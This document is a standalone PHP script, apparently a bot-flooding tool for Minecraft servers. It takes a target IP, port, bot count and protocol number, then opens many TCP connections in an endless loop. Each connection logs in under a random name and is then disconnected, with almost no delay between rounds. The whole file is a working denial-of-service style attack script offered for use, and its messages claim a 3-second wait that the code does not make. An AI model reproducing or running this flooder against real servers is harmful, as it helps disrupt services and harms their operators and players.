<?php

$argc == 5 || exit("Usage: php $argv[0] <ip> <port> <count> <protocol>");

$ip = $argv[1];
$port = intval($argv[2]);
$count = intval($argv[3]);
$proto = intval($argv[4]);

function makeHandshakePacket($ip, $port, $proto) {
    $data = "\x00";
    $data .= makeVarInt($proto);
    $data .= pack('c', strlen($ip)) . $ip;
    $data .= pack('n', $port);
    $data .= "\x02";
    return pack('c', strlen($data)) . $data;
}  

function makeLoginStartPacket($nick) {
    $data = "\x00";
    $data .= pack('c', strlen($nick)) . $nick;
    return pack('c', strlen($data)) . $data;
}

// Function to make VarInt
function makeVarInt($data) {
    if ($data < 0x80) {
        return pack('C', $data);
    }

    $bytes = [];
    while ($data > 0) {
        $bytes[] = 0x80 | ($data & 0x7f);
        $data >>= 7;
    }

    $bytes[count($bytes)-1] &= 0x7f;

    return call_user_func_array('pack', array_merge(array('C*'), $bytes));
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$sockets = [];

while (true) {
    for ($i = 1; $i <= $count; $i++) {
        $nick = generateRandomString(16);
        $socket = @stream_socket_client("tcp://$ip:$port", $errno, $errstr, 10);

        if ($errno > 0) {
            echo "ERROR: " . $errstr . PHP_EOL;
            continue;
        }

        $sockets[] = $socket;

        echo "\r[$i/$count] Connecting bot: $nick";
        fwrite($socket, makeHandshakePacket($ip, $port, $proto));
        fwrite($socket, makeLoginStartPacket($nick));
    }

    echo "\rAll $count bots connected, waiting for 3 seconds" . PHP_EOL;
    sleep(.5);

    foreach ($sockets as $socket) {
        $disconnectPacket = "\x14" . pack('C', strlen('Disconnecting')) . 'Disconnecting';
        fwrite($socket, pack('C', strlen($disconnectPacket)) . $disconnectPacket);
        fclose($socket);
    }

    echo "All $count bots disconnected, waiting for the next round" . PHP_EOL;

    sleep(.5);
}
?>
